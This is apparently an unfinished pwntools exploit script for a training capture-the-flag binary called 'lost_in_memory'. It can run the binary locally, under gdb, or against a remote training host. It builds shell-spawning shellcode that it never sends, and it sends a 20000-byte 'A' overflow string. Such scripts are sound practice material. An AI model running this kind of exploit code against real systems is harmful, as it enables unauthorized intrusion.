from pwn import *
import sys

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./lost_in_memory")
        gdb.attach(c, """
        """)
        input("Wait")
    elif(sys.argv[1] == '-r'):
        c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./lost_in_memory")

shellcode="""
    nop
    nop
    nop
    nop
"""

shellcode += shellcraft.sh()
c.sendline(20000*b"A")
c.interactive()
